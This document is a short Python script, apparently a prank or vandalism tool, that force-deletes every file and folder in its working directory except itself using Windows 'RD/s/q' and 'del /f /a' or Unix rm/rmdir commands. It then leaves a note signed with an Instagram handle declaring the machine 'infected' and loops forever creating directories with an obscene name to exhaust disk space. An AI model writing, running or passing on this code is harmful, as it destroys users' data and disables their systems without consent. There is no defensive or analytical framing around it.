import glob
import os


def files(directory='.'):
    return [file for file in glob.glob('*')]


file = files()

if os.name == 'nt':
    for i in file:
        if i != 'script.py':
            if '.' not in i:
                os.system(f'RD/s/q {i}')
            elif '.' in i:
                os.system(f'del /f /a {i}')

else:
    for i in file:
        if i != 'script.py':
            if '.' not in i:
                os.system(f'rmdir {i}')
            elif '.' in i:
                os.system(f'rm {i}')

contador = 0
o = open('recado.txt', 'w')
o.write('infectado por @cauabeisola (insta)')


def armagedon():
    while True:
        global contador
        os.system(f'mkdir se-fodeu-{contador}-vezes')
        contador += 1


os.system('recado.txt')
armagedon()